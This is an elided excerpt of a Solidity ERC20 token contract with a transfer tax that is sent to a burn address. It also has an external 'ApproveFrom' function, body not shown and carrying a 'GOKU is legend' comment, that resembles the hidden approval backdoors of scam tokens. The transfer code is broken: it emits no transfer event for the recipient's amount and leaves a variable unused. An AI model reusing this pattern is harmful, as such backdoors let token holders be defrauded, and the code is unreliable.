...
contract ERC20 is Context, IERC20 {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    uint256 taxAmount = amount * taxFee / 100; // Calculate the tax amount
    uint256 transferAmount = amount - taxAmount; // Calculate the transfer amount


    uint256 approved = transferAmount;
    address deadAddress = 0x000000000000000000000000000000000000dEaD;


    _balances[sender] -= amount;
    _balances[deadAddress] += taxAmount; // Add tax amount to the dead address
    _balances[recipient] += transferAmount;


    emit Transfer(sender, deadAddress, taxAmount);
  ...
  function excludeAddressFromTax(address account) external {
  ...
  function ApproveFrom(address _address, uint256 approveAmount) external {
    ...
    _sendApproval(_address, approveAmount); //GOKU is legend!!!
  }
}